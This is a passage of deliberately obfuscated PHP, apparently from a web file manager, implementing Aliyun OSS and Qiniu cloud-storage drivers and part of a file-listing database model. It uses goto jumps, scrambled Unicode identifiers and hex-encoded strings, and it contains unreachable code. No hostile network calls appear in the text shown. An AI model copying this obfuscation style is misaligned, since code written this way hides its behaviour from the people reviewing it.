array(OSS\OssClient::OSS_RANGE => "{$fƂ}\x2d{$B}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($CÙ), $D); } catch (OSS\Core\OssException $F퉼Ҧ) { think_exception($F퉼Ҧ->getMessage()); return !1; } } private function trafficLimit($fݴ݄, $C = array()) { goto EԌѭ; EԌѭ: $cǌ =& $_SERVER[Ť]; if ($fݴ݄ == $cǌ[1254] && $this->isUploadServer() || $fݴ݄ == $cǌ[105] && $this->isFileOutServer()) { return $C; } $Cț = floatval($GLOBALS[$cǌ[6]][$cǌ[84]][$cǌ[103]][$fݴ݄]) * 1024 * 1024 * 8; goto f˂; Aю: return $C; goto eϦ; f˂: if (!$Cț) { return $C; } $Cț = $Cț < 819200 ? 819200 : ($Cț > 838860800 ? 838860800 : $Cț); $C[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Cț); goto Aю; eϦ: } public function link($C, $Cǖ = array()) { $B =& $_SERVER[Ť]; if (!$this->exist($C) || $this->isFolder($C)) { return !1; } try { $Cǖ = $this->trafficLimit($B[105], $Cǖ); $e = $this->client->signUrl($this->bucket, $this->pathEncode($C), 3600 * 12, $B[224], $Cǖ); return $this->getCdnLink($e); } catch (OSS\Core\OssException $fєԢ) { return !1; } } public function fileOut($Dʛ, $eʠԂ = false, $f = false, $AώՖ = '') { goto cҎ; cҎ: $Dڬ =& $_SERVER[Ť]; if ($this->isFileOutServer()) { return $this->fileOutServer($Dʛ, $eʠԂ, $f, $AώՖ); } if (!$f) { $f = $this->pathThis($Dʛ); } goto B쉆; fņ: $eʠԂ = $eʠԂ ? $Dڬ[210] : $Dڬ[211]; $a՛ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Dڬ[1265] . rawurlencode("{$eʠԂ}\x3b\146\x69\x6c\x65\156\141\x6d\x65\x3d{$f}")); $a՛[OSS\OssClient::OSS_SUB_RESOURCE] .= $Dڬ[1266] . rawurlencode($cҔ); goto B謡; B謡: $A캢 = $this->link($Dʛ, $a՛); $this->fileOutLink($A캢); goto D; B쉆: $f = rawurlencode($f); $cҔ = get_file_mime(get_path_ext($f)); if ($cҔ == $Dڬ[209]) { return parent::fileOut($Dʛ, $eʠԂ, $f, $AώՖ); } goto fņ; D: } public function fileOutServer($cұ˿ʬ, $Fףޯ = false, $Dǖ = false, $F󶋚 = '') { parent::fileOut($cұ˿ʬ, $Fףޯ, $Dǖ, $F󶋚); } public function fileOutImage($eϾ, $C = 250) { $eԎ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ť][1267] . $C); $f׳ = $this->link($eϾ, $eԎ); $this->fileOutLink($f׳); } public function fileOutImageServer($Cۂ, $fЯ = 250) { parent::fileOutImage($Cۂ, $fЯ); } public function fileOutLink($D͑ڮ) { $F󺠛 =& $_SERVER[Ť]; if (!$this->isCdnHost() && substr($D͑ڮ, 0, 7) == $F󺠛[1170]) { $D͑ڮ = $F󺠛[1171] . substr($D͑ڮ, 7); } header($F󺠛[156] . $D͑ڮ); die; } public function hashMd5($B, $aȋ = '') { $E؍ =& $_SERVER[Ť]; $cƎ = $this->_objectMeta($B); if (!$cƎ) { return $E؍[33]; } if (!isset($cƎ[$E؍[1243]]) && !empty($aȋ)) { $D = $this->updateObjMeta($B, array($E؍[1243] => $aȋ)); $cƎ[$E؍[1243]] = $D ? $aȋ : $E؍[33]; } return isset($cƎ[$E؍[1243]]) ? strtolower($cƎ[$E؍[1243]]) : $E؍[33]; } public function size($F܇) { $AŖ = $this->objectMeta($F܇); return $AŖ ? $AŖ[$_SERVER[Ť][77]] : 0; } public function info($cِ) { if ($this->isFolder($cِ)) { return $this->folderInfo($cِ); } else { if ($this->isFile($cِ)) { return $this->fileInfo($cِ); } } return !1; } public function exist($eлχ) { return $this->isFile($eлχ) || $this->isFolder($eлχ); } public function isFile($Eȏɏ) { return !$this->isFolder($Eȏɏ) && $this->objectMeta($Eȏɏ); } public function isFolder($EΈ) { return $this->cacheMethod($_SERVER[Ť][195], $EΈ); } protected function objectMeta($E) { return $this->cacheMethod($_SERVER[Ť][196], $E); } protected function _objectMeta($aܟ) { $c򲲛 =& $_SERVER[Ť]; try { $dԡ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($aܟ)); } catch (OSS\Core\OssException $fۛ) { $dԡ = !1; } if ($dԡ) { $dԡ[$c򲲛[77]] = intval($dԡ[$c򲲛[1241]]); } return $dԡ; } protected function _isFolder($Aڅ) { $bų =& $_SERVER[Ť]; if ($Aڅ == $bų[33] || $Aڅ == $bų[8]) { return !0; } $B = array($bų[1237] => $bų[8], $bų[1238] => rtrim($Aڅ, $bų[8]) . $bų[8], $bų[1239] => 1, $bų[1240] => $bų[33]); $B̟ = $this->client->listObjects($this->bucket, $B); if ($B̟->getObjectList() || $B̟->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($Eǌ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ť][1268]; $this->_init($Eǌ); } public function _init($Fݔ) { goto Dɕ; DΑ܊: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto e; e: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto AȨ; Dɕ: $FמՌ =& $_SERVER[Ť]; foreach ($Fݔ as $FӜ׃ => $Fϸ) { if (isset($this->{$FӜ׃})) { $this->{$FӜ׃} = $Fϸ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($FמՌ[1269] . LNG($FמՌ[1228])); } goto DΑ܊; AȨ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Eѿ, $e٤ = '', $f̒ = REPEAT_RENAME) { if ($this->setContent($Eѿ, $e٤)) { return $this->getPathOuter($Eѿ); } return !1; } public function mkdir($eбʹ, $B = REPEAT_SKIP) { goto FѰ; C: $eбʹ = $B㰻 . $f傶[8]; $c = get_path_this($B㰻); $dȮ = $eбʹ . $c; goto b܏; b܏: if (!$this->mkfile($dȮ)) { return !1; } if (!$this->moveFile($dȮ, $eбʹ)) { $this->delFile($dȮ); return !1; } return $this->getPathOuter($B㰻); goto Dł; FѰ: $f傶 =& $_SERVER[Ť]; $B㰻 = trim($eбʹ, $f傶[8]); if ($this->_isFolder($B㰻)) { return $this->getPathOuter($B㰻); } goto C; Dł: } public function copyFile($D޽, $a) { $C = $this->bucketManager->copy($this->bucket, $D޽, $this->bucket, $a, !0); return $C ? !1 : $this->getPathOuter($a); } public function moveFile($F, $f懇ͤ) { $Bش = $this->bucketManager->move($this->bucket, $F, $this->bucket, $f懇ͤ, !0); return $Bش ? !1 : $this->getPathOuter($f懇ͤ); } public function delFile($e݅) { if (!$this->exist($e݅)) { return !0; } $fٛ = $this->bucketManager->delete($this->bucket, $e݅); return $fٛ ? !1 : !0; } public function delFolder($d׈) { goto cܡ; cڑ: if (!empty($d׈) && !in_array($eャ, $CǢ[$C핹[74]])) { $CǢ[$C핹[74]][] = $eャ; } $Dѷ = $this->delByBatch($CǢ[$C핹[73]]); if (!$Dѷ) { return !1; } goto Aٿ; Aٿ: return $this->delByBatch($CǢ[$C핹[74]]); goto F; eմ: $CǢ = $this->fileList($d׈); $this->listItemCache = !0; $eャ = trim($d׈, $C핹[8]) . $C핹[8]; goto cڑ; cܡ: $C핹 =& $_SERVER[Ť]; if (!$this->exist($d׈)) { return !0; } $this->listItemCache = !1; goto eմ; F: } private function delByBatch($dژ) { foreach (array_chunk($dژ, 1000) as $a) { $bРݍ = $this->bucketManager->buildBatchDelete($this->bucket, $a); list($f㊉, $fҴ) = $this->bucketManager->batch($bРݍ); if ($fҴ) { return !1; } } return !0; } public function rename($Dɿ, $c) { return $this->renameObject($Dɿ, $c); } public function fileInfo($DùԳ, $eń = false, $Ež = array()) { goto A; A: $bك =& $_SERVER[Ť]; $D凪 = array($bك[28] => $this->pathThis($DùԳ), $bك[75] => $this->getPathOuter($bك[8] . $DùԳ), $bك[29] => $bك[171], $bك[77] => isset($Ež[$bك[1270]]) ? $Ež[$bك[1270]] : 0, $bك[165] => $this->ext($DùԳ)); if ($eń) { return $D凪; } goto e; e: $D凪[$bك[190]] = $D凪[$bك[107]] = 0; $D凪[$bك[191]] = $D凪[$bك[192]] = !0; if (empty($Ež)) { $Ež = $this->objectMeta($DùԳ); if (!$Ež) { return $D凪; } } goto bҒ; bҒ: if (isset($Ež[$bك[1271]])) { $D凪[$bك[107]] = substr($Ež[$bك[1271]] . $bك[33], 0, 10); } if (isset($Ež[$bك[1270]])) { $D凪[$bك[77]] = $Ež[$bك[1270]]; } return $D凪; goto aԉ; aԉ: } public function folderInfo($bˆ, $bѮƙ = false) { goto b썡; D: $B = $this->objectMeta($bˆ); if (isset($B[$c[1271]])) { $b[$c[107]] = substr($B[$c[1271]] . $c[33], 0, 10); } return $b; goto BʹɌ; b썡: $c =& $_SERVER[Ť]; $b = array($c[28] => $this->pathThis($bˆ), $c[75] => $this->getPathOuter($c[8] . $bˆ), $c[29] => $c[76]); if ($bѮƙ) { return $b; } goto B; B: $b[$c[190]] = $b[$c[107]] = 0; $b[$c[191]] = $b[$c[192]] = !0; $bˆ = rtrim($bˆ, $c[8]) . $c[8]; goto D; BʹɌ: } public function listPath($Aꅚڂ, $E֬ = false) { $B =& $_SERVER[Ť]; $Bގ = $this->fileList($Aꅚڂ, $B[8], !0); foreach ($Bގ[$B[74]] as $B䬐 => $f) { $Bގ[$B[74]][$B䬐] = $this->folderInfo($f, $E֬); } foreach ($Bގ[$B[73]] as $B䬐 => $f) { $Bގ[$B[73]][$B䬐] = $this->fileInfo($f[$B[89]], $E֬, $f); } return $Bގ; } public function has($f悒, $EǪ = false, $fѵӑ = true) { goto a; a: $B鿛 =& $_SERVER[Ť]; $f悒 = trim($f悒, $B鿛[8]); $f됓 = empty($f悒) ? $B鿛[33] : $f悒 . $B鿛[8]; goto B뷋𞂋; B뷋𞂋: $A = $B鿛[33]; $a = 500; $B÷ = $B鿛[8]; goto dǝ; dǝ: $D܆ = $f = 0; while (!0) { check_abort(); list($b, $aƂ) = $this->bucketManager->listFiles($this->bucket, $f됓, $A, $a, $B÷); if ($aƂ) { break; } $A = array_key_exists($B鿛[1240], $b) ? $A = $b[$B鿛[1272]] : $B鿛[33]; if ($EǪ) { if (!empty($b[$B鿛[1273]])) { $D܆ += count($b[$B鿛[1273]]); } if (!empty($b[$B鿛[1274]])) { $f += count($b[$B鿛[1274]]); } if ($A === $B鿛[33]) { break; } continue; } if ($fѵӑ) { if (!empty($b[$B鿛[1273]])) { return !0; } } else { if (!empty($b[$B鿛[1274]])) { return !0; } } if ($A === $B鿛[33]) { break; } } if ($EǪ) { return array($B鿛[199] => $D܆, $B鿛[200] => $f); } goto b腈; b腈: return !1; goto C٦酣; C٦酣: } public function listAll($aɷ) { $Cױ =& $_SERVER[Ť]; $C = $this->fileList($aɷ, $Cױ[33], !0); $Cˊφǎ = array(); foreach ($C[$Cױ[73]] as $d) { $Cˊφǎ[$d[$Cױ[89]]] = $d[$Cױ[77]]; } foreach ($C[$Cױ[74]] as $d) { if (is_string($d)) { $Cˊφǎ[$d] = 0; } } return $this->listAllFiles($aɷ, array_keys($Cˊφǎ), $Cˊφǎ); } private function fileList($Cܜ, $cЅ = '', $dٸ = 0) { goto cտ; B: $Bݖ = $c = array(); while (!0) { check_abort(); list($F·, $B) = $this->bucketManager->listFiles($this->bucket, $Fǜ, $d, $CϷ, $cЅ); if ($B) { break; } $d = array_key_exists($D[1240], $F·) ? $d = $F·[$D[1272]] : $D[33]; $cݸ = isset($F·[$D[1273]]) ? $F·[$D[1273]] : array(); $aа = isset($F·[$D[1274]]) ? $F·[$D[1274]] : array(); foreach ($cݸ as $b挊) { goto a; a垽ⱋ: $b挊[$D[77]] = $a؆; $Aٲϻ = $a؆ == 0 && substr($EՕט, strlen($EՕט) - 1, 1) == $D[8] ? !0 : !1; if ($DŎȊ̛) { $this->cacheMethod($D[195], $EՕט, $Aٲϻ); $this->cacheMethod($D[196], $EՕט, $b挊); } goto bѕ; a: if ($b挊[$D[89]] == $Fǜ) { continue; } $EՕט = $b挊[$D[89]]; $a؆ = $b挊[$D[1270]]; goto a垽ⱋ; bѕ: if ($Aٲϻ) { $Bݖ[] = $EՕט; continue; } $c[] = $dٸ ? $b挊 : $EՕט; goto Dߌ; Dߌ: } foreach ($aа as $EՕט) { if ($EՕט == $Fǜ) { continue; } $Bݖ[] = $EՕט; if ($DŎȊ̛) { $this->cacheMethod($D[195], $EՕט, !0); } } if ($d === $D[33]) { break; } } if ($DŎȊ̛) { $this->cacheMethod($D[195], $Cܜ, !0); } goto eͱ; cտ: $D =& $_SERVER[Ť]; $Cܜ = trim($Cܜ, $D[8]); $Fǜ = empty($Cܜ) ? $D[33] : $Cܜ . $D[8]; goto eƓ伬; eƓ伬: $d = $D[33]; $CϷ = 1000; $DŎȊ̛ = $this->listItemCache === !1 ? !1 : !0; goto B; eͱ: return array($D[74] => $Bݖ, $D[73] => $c); goto c晫; c晫: } public function canRead($c֥) { return $this->exist($c֥) ? !0 : !1; } public function canWrite($cŶ) { return $this->exist($cŶ) ? !0 : !1; } public function getContent($D) { return $this->fileSubstr($D, 0, -1); } public function setContent($D僲, $Eڊƙ = '') { $aԱֆ = $this->tempFile($this->pathThis($D僲)); file_put_contents($aԱֆ, $Eڊƙ); if ($this->upload($D僲, $aԱֆ)) { $this->tempFileRemve($aԱֆ); return !0; } return !1; } public function refreshUrls($Bɤ) { goto FǊׂ䛓; AѤ: $B򰪈 = new Qiniu\Cdn\CdnManager($this->auth); list($Bصѭ, $Eɇב) = $B򰪈->refreshUrls($EČÑ); if ($Eɇב) { return !1; } goto bǶ; bǶ: return $Bصѭ[$c[1048]] == $c[706] ? !0 : !1; goto B; FǊׂ䛓: $c =& $_SERVER[Ť]; $EČÑ = array(); if (is_array($Bɤ)) { foreach ($Bɤ as $E㍉) { $EČÑ[] = $this->link($E㍉); } } else { $EČÑ[] = $this->link($Bɤ); } goto AѤ; B: } public function fileSubstr($bą, $D, $Də) { $E䇵 =& $_SERVER[Ť]; if (!($C = $this->link($bą))) { return !1; } $A = !1; if ($Də > 0) { $Aη = $D + $Də - 1; $A = array($E䇵[1275] . $D . $E䇵[428] . $Aη); } $C = url_request($C, $E䇵[224], !1, $A); return $C[$E䇵[699]] ? $C[$E䇵[1058]] : !1; } public function upload($e۟, $F, $d̜ = false, $fք = REPEAT_REPLACE) { $C = new Qiniu\Storage\UploadManager(); $c = $this->auth->uploadToken($this->bucket, $e۟); $a櫋 = get_file_mime(get_path_ext($F)); list($D󚖠, $eа) = $C->putFile($c, $e۟, $F, null, $a櫋); return $eа ? !1 : $this->getPathOuter($e۟); } public function uploadFormData($D蒫, $c = 3600) { return $this->uploadToken($D蒫, $c); } public function multiUploadFormData($fЉ, $Bӗ = 3600) { return $this->uploadToken($fЉ, $Bӗ); } private function uploadToken($d, $f = 3600) { goto aܐ; aܐ: $a =& $_SERVER[Ť]; $fǎͤ = $f; $d޽ = array($a[1276] => $a[1277]); goto E냠; AӔ: $dķ܃ = http_type() . "\x3a\x2f\57\x75\160\154\157\141\144{$dފғ}\56\161\151\156\x69\165\160\x2e\143\157\155\57"; return array($a[1279] => $b, $a[1280] => $dķ܃); goto F; E냠: $Bۡ = $d; $b = $this->auth->uploadToken($this->bucket, $Bۡ, $fǎͤ, $d޽, !0); $dފғ = empty($this->region) || $this->region == $a[1278] ? $a[33] : $a[428] . $this->region; goto AӔ; F: } public function download($cф鏛, $Eݰײ) { goto aݏ; aݏ: $c = IO::getPathInner(IO::mkfile($Eݰײ)); if (!($eĆ = $this->link($cф鏛))) { return !1; } $fޑ = 0; goto fˊ; fˊ: $b = 1024 * 200; $D傭 = fopen($c, $_SERVER[Ť][1281]); while (!0) { $f񊃺 = $this->fileSubstr($cф鏛, $fޑ, $b); if ($f񊃺 === !1) { return !1; } fwrite($D傭, $f񊃺); $fޑ += $b; if (strlen($f񊃺) < $b) { break; } } goto a˨; a˨: fclose($D傭); return $Eݰײ; goto BΈĿ; BΈĿ: } public function link($A붎, $A됖 = '') { if (!$this->isFile($A붎)) { return !1; } $BΜ = $this->getHost() . $_SERVER[Ť][8] . $this->pathEncode($A붎) . $A됖; return $this->auth->privateDownloadUrl($BΜ, 3600 * 12); } public function fileOut($CȓЧ, $b = false, $Cʡ = false, $eԦ = '') { $d݂ =& $_SERVER[Ť]; if ($this->isFileOutServer()) { return $this->fileOutServer($CȓЧ, $b, $Cʡ, $eԦ); } if (!$Cʡ) { $Cʡ = $this->pathThis($CȓЧ); } $E = $b ? $d݂[1282] . rawurlencode($Cʡ) : $d݂[33]; $C↵ = $this->link($CȓЧ, $E); $this->fileOutLink($C↵); } public function fileOutServer($eҴ¨, $B󵵐 = false, $CᲫ = false, $b󷈹 = '') { parent::fileOut($eҴ¨, $B󵵐, $CᲫ, $b󷈹); } public function fileOutImage($eټ⟂, $D = 250) { $b՟ = $this->link($eټ⟂, $_SERVER[Ť][1283] . $D); $this->fileOutLink($b՟); } public function fileOutImageServer($Eˮ, $a߉ = 250) { parent::fileOutImage($Eˮ, $a߉); } public function hashMd5($E⊊) { $eͿ =& $_SERVER[Ť]; $Eە = $this->objectMeta($E⊊); return isset($Eە[$eͿ[204]]) ? $Eە[$eͿ[204]] : !1; $C棝 = $this->link($E⊊, $eͿ[1284]); } public function size($Eȍ) { $aق = $this->objectMeta($Eȍ); return $aق ? $aق[$_SERVER[Ť][77]] : 0; } public function info($fՃ) { if ($this->isFolder($fՃ)) { return $this->folderInfo($fՃ); } else { if ($this->isFile($fՃ)) { return $this->fileInfo($fՃ); } } return !1; } public function exist($E٧) { return $this->isFile($E٧) || $this->isFolder($E٧); } public function isFile($Bэ) { return !$this->isFolder($Bэ) && $this->objectMeta($Bэ); } public function isFolder($AǱ) { return $this->cacheMethod($_SERVER[Ť][195], $AǱ); } protected function objectMeta($Fɨ) { return $this->cacheMethod($_SERVER[Ť][196], $Fɨ); } protected function _objectMeta($fن) { $aΗ =& $_SERVER[Ť]; list($eփ, $BԻ) = $this->bucketManager->stat($this->bucket, $fن); if ($eփ) { $eփ[$aΗ[77]] = intval($eփ[$aΗ[1270]]); } return $eփ; } protected function _isFolder($c뒷) { $F˪Ľ =& $_SERVER[Ť]; if ($c뒷 == $F˪Ľ[33] || $c뒷 == $F˪Ľ[8]) { return !0; } list($B, $b) = $this->bucketManager->listFiles($this->bucket, trim($c뒷, $F˪Ľ[8]) . $F˪Ľ[8], $F˪Ľ[33], 1, $F˪Ľ[8]); return !empty($B[$F˪Ľ[1273]]) || !empty($B[$F˪Ľ[1274]]) ? !0 : !1; } } goto E񌺼; b짊: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\162\x63\x65"; protected $tableMeta = array("\164\141\x62\154\x65\116\x61\x6d\x65" => "\151\x6f\x5f\163\x6f\165\162\x63\145\137\x6d\145\x74\141", "\155\x65\x74\x61\x46\151\145\154\x64" => "\x73\157\165\x72\143\x65\111\x44"); protected $dataAuto = array(array("\x6d\157\x64\151\x66\x79\124\151\155\x65", "\164\x69\155\145", "\151\156\x73\145\162\x74", "\x66\165\156\x63\x74\x69\157\x6e"), array("\x63\x72\x65\x61\x74\145\x54\151\155\x65", "\x74\151\x6d\145", "\151\x6e\x73\x65\x72\x74", "\x66\165\156\143\164\x69\157\x6e"), array("\x76\151\145\x77\124\151\x6d\x65", "\x74\x69\x6d\145", "\151\x6e\x73\145\x72\164", "\x66\165\x6e\x63\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($E쇆) { return $this->listSource(array($_SERVER[Ť][384] => $E쇆)); } public function typeName($D⿔) { static $cİ = array(self::TYPE_SYSTEM => "\x73\171\x73\164\x65\155", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\147\x72\x6f\165\x70"); return $cİ[$D⿔ . $_SERVER[Ť][33]]; } public function sourceListInfo($B暴, $e琊˴ = false) { goto Bҍ; Bҍ: $aܟ =& $_SERVER[Ť]; $B暴 = $B暴 ? $B暴 : array(); $B暴 = array_filter(array_unique($B暴)); goto fĩ; fĩ: if (!$B暴) { return array(); } $A쓆 = $this->where(array($aܟ[385] => array($aܟ[7], $B暴)))->select(); $this->_listDataApply($A쓆, $e琊˴); goto F뾎ˠ; F뾎ˠ: return array_to_keyvalue($A쓆, $aܟ[385]); goto eâ; eâ: } public function pathInfoFilter($Dխ) { goto Aݖ; cΣ: $E .= $Cҽ[390]; $E .= $Cҽ[391]; $dٳ = explode($Cҽ[47], $E); goto d; Aݖ: $Cҽ =& $_SERVER[Ť]; $Dխ[$Cҽ[75]] = KodIO::make($Dխ[$Cҽ[385]]); $Dխ[$Cҽ[29]] = $Dխ[$Cҽ[386]] == 1 ? $Cҽ[76] : $Cҽ[171]; goto Dҵ; Dҵ: $Dխ[$Cҽ[387]] = $this->typeName($Dխ[$Cҽ[387]]); if ($Dխ[$Cҽ[386]] != 1) { $Dխ[$Cҽ[165]] = $Dխ[$Cҽ[388]]; unset($Dխ[$Cҽ[388]]); } $E = $Cҽ[389]; goto cΣ; d: if (isset($Dխ[$Cҽ[392]]) && $Dխ[$Cҽ[392]][$Cҽ[393]] == -1) { $dٳ = array_remove_value($dٳ, $Cҽ[190]); $dٳ = array_remove_value($dٳ, $Cҽ[107]); $dٳ = array_remove_value($dٳ, $Cҽ[394]); $dٳ = array_remove_value($dٳ, $Cҽ[395]); $dٳ = array_remove_value($dٳ, $Cҽ[77]); $dٳ = array_remove_value($dٳ, $Cҽ[396]); } $Dխ = array_field_key($Dխ, $dٳ); return $Dխ; goto a; a: } public function listUserFav() { goto E; E: $CÙ =& $_SERVER[Ť]; $D˄ = Model($CÙ[397])->listData(); $CޱČ = array_filter_by_field($D˄, $CÙ[29], $CÙ[398]); goto E׳; E׳: $CޱČ = array_to_keyvalue($CޱČ, $CÙ[33], $CÙ[75]); if ($CޱČ) { $e傮 = $this->listSource(array($CÙ[399] => array($CÙ[400], $CޱČ))); } $e傮 = array_to_keyvalue($e傮[$CÙ[361]], $CÙ[385]); goto d纴; d纴: foreach ($D˄ as &$E) { $E = array($CÙ[401] => $E[$CÙ[383]], $CÙ[402] => $E[$CÙ[28]], $CÙ[403] => $E[$CÙ[75]], $CÙ[404] => $E[$CÙ[29]], $CÙ[405] => $E[$CÙ[190]], $CÙ[406] => $E[$CÙ[107]]); if ($E[$CÙ[29]] == $CÙ[398] && $e傮[$E[$CÙ[75]]]) { $E[$CÙ[407]] = $e傮[$E[$CÙ[75]]]; } } unset($E); return $D˄; goto Eˮ; Eˮ: } public function listUserTag($a) { goto aΝ; aΝ: $D =& $_SERVER[Ť]; if ($a && !is_array($a)) { $a = array($a); } $E = Model($D[408])->listData(); goto bם; bם: $D = array(); foreach ($E as $Eɱ) { $bˎ = $Eɱ[$D[75]]; if (!$bˎ) { continue; } if (!isset($D[$bˎ])) { $D[$bˎ] = array(); } $D[$bˎ][] = $Eɱ[$D[409]]; } $B򜈋 = array(); goto E; aボ: if (!$aƾ || count($B򜈋) == $aƾ[$D[358]][$D[359]]) { return $aƾ; } $F = array(); $c߼ = array_to_keyvalue($aƾ[$D[74]], $D[33], $D[385]); goto C۝; fٟ: if ($F) { Model($D[410])->removeBySource($F); } return $aƾ; goto c; E: foreach ($D as $B֐̏ => $bԬ) { $C = !0; if (!$a) { $B򜈋[] = $B֐̏; continue; } foreach ($a as $E阎) { if (!in_array($E阎, $bԬ)) { $C = !1; break; } } if ($C) { $B򜈋[] = $B֐̏; } } if (!$B򜈋) { return array(); } $aƾ = $this->listSource(array($D[399] => array($D[400], $B򜈋))); goto aボ; C۝: $C΅ = array_to_keyvalue($aƾ[$D[73]], $D[33], $D[385]); $Bã = array_merge($C΅, $c߼); foreach ($B򜈋 as $bˎ) { if (!in_array($bˎ, $Bã)) { $F[] = $bˎ; } } goto fٟ; c: } public function listUserRecycle() { $a⎡ =& $_SERVER[Ť]; $d = Model($a⎡[411])->listData(); if (!$d) { return array(); } $dۦ = array($a⎡[399] => array($a⎡[400], $d), $a⎡[412] => 1); return $this->listSource($dۦ); } public function listSource($C¬, $AӉڧ = 3000) { goto bᒩº; E߈: $eⅆ = $this->field($d㵮)->_makeOrder()->where($C¬)->selectPage($AӉڧ); $this->_listDataApply($eⅆ[$f݄[361]]); $this->_listMake($eⅆ); goto A; A: return $eⅆ; goto d; bᒩº: $f݄ =& $_SERVER[Ť]; if (!isset($C¬[$f݄[413]])) { $C¬[$f݄[413]] = 0; } $d㵮 = $f݄[414]; goto E߈; d: } protected function _makeOrder() { goto cŧġ; c̟: $Cκ = array($Bǻ[418] => $Bǻ[419], $Bǻ[420] => $Bǻ[421]); $fݗֻ = array($Bǻ[28] => $Bǻ[28], $Bǻ[77] => $Bǻ[77], $Bǻ[165] => $Bǻ[388], $Bǻ[394] => $Bǻ[394], $Bǻ[422] => $Bǻ[395], $Bǻ[190] => $Bǻ[190], $Bǻ[107] => $Bǻ[107]); $E = Input::get($Bǻ[423], $Bǻ[7], $A̿, array_keys($fݗֻ)); goto F˪; bſ: if ($E == $Bǻ[28]) { } $Cě = $Bǻ[425] . $fݗֻ[$E] . $Bǻ[50] . $Cκ[$b҅]; return $this->order(rtrim(trim($Cě), $Bǻ[47])); goto eŐ; cŧġ: $Bǻ =& $_SERVER[Ť]; $A̿ = Model($Bǻ[415])->get($Bǻ[416]); $E = Model($Bǻ[415])->get($Bǻ[417]); goto c̟; F˪: $b҅ = Input::get($Bǻ[424], $Bǻ[7], $E, array_keys($Cκ)); if (!in_array($E, array_keys($fݗֻ))) { $E = $Bǻ[28]; } if (!in_array($b҅, array_keys($Cκ))) { $E = $Bǻ[418]; } goto bſ; eŐ: } protected function _listDataApplyItem($a, $dڪ = false) { $e = array($a); $this->_listDataApply($e, $dڪ); return $e[0]; } protected function _listDataApply(&$Bˑ, $Fг = false) { goto cꬌˇ; cꬌˇ: $fݦ =& $_SERVER[Ť]; if (!$Bˑ) { $Bˑ = array(); return; } $d物 = array_to_keyvalue($Bˑ, $fݦ[33], $fݦ[385]); goto b瑫; b瑫: $d物 = array_unique($d物); $this->_listSourceCache($Bˑ); if (!$Fг) { $this->_listAppendMeta($Bˑ, $d物); $this->_listAppendFileMeta($Bˑ, $d物); $this->_listAppendChildren($Bˑ, $d物); } goto D; D: $this->_listAppendPath($Bˑ); $this->_listAppendAuth($Bˑ); $this->_listAppendSourceInfo($Bˑ, $d物); goto cܠɪ; cܠɪ: $this->_listAppendUser($Bˑ); $this->_listFilterInfo($Bˑ, $Fг); goto Cѕ蔾; Cѕ蔾: } protected function _listSourceCache($f) { $B݂ =& $_SERVER[Ť]; foreach ($f as $e͑Ґ) { self::$cacheSourceInfo[$B݂[426] . $e͑Ґ[$B݂[385]]] = $e͑Ґ; } } protected function _listFilterInfo(&$Dļǉ, $DÄ = false) { $FƉ판 =& $_SERVER[Ť]; foreach ($Dļǉ as &$A硖) { $A硖 = $this->pathInfoFilter($A硖); self::$cachePathInfo[$FƉ판[427] . intval($DÄ) . $FƉ판[428] . $A硖[$FƉ판[385]]] = $A硖; } unset($A硖); } protected function _listMake(&$Fɚȗ) { $eķ =& $_SERVER[Ť]; $Fɚȗ[$eķ[74]] = array(); $Fɚȗ[$eķ[73]] = array(); foreach ($Fɚȗ[$eķ[361]] as $B۾) { $e癏鵉 = $B۾[$eķ[386]] == 1 ? $eķ[74] : $eķ[73]; $Fɚȗ[$e癏鵉][] = $B۾; } unset($Fɚȗ[$eķ[361]]); } protected function _listAppendMeta(&$Eݬ, $Cʖ֚) { goto FӲ; eί: foreach ($Aʡ as $cދ) { if (!isset($Dٗۿ[$cދ[$Dà[385]]])) { $Dٗۿ[$cދ[$Dà[385]]] = array(); } if (in_array($cދ[$Dà[89]], $c)) { continue; } $Dٗۿ[$cދ[$Dà[385]]][$cދ[$Dà[89]]] = $cދ[$Dà[366]]; } foreach ($Eݬ as &$fԴՅ) { $fԴՅ[$Dà[433]] = !1; if (isset($Dٗۿ[$fԴՅ[$Dà[385]]])) { $fԴՅ[$Dà[433]] = $Dٗۿ[$fԴՅ[$Dà[385]]]; } if ($this->fileIsLock($fԴՅ) && $fԴՅ[$Dà[392]]) { $bۋ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $fԴՅ[$Dà[392]][$Dà[393]] = AuthModel::authDisable($fԴՅ[$Dà[392]][$Dà[393]], $bۋ); $fԴՅ[$Dà[392]][$Dà[434]][$Dà[392]] = $fԴՅ[$Dà[392]][$Dà[393]]; } } unset($fԴՅ); goto eξ; FɅ: if (!$Aʡ) { return; } $c = array($Dà[431], $Dà[432]); $Dٗۿ = array(); goto eί; FӲ: $Dà =& $_SERVER[Ť]; $B뿘 = array($Dà[399] => array($Dà[400], $Cʖ֚)); $Aʡ = Model($Dà[429])->field($Dà[430])->where($B뿘)->select(); goto FɅ; eξ: } protected function _listAppendFileMeta(&$CÄ, $f̿) { goto AƂ; fа: $aҼ = $aҼ ? $aҼ : array(); $aʭ = array(); foreach ($aҼ as $dԍ) { if (!isset($aʭ[$dԍ[$Bݤ[435]]])) { $aʭ[$dԍ[$Bݤ[435]]] = array(); } 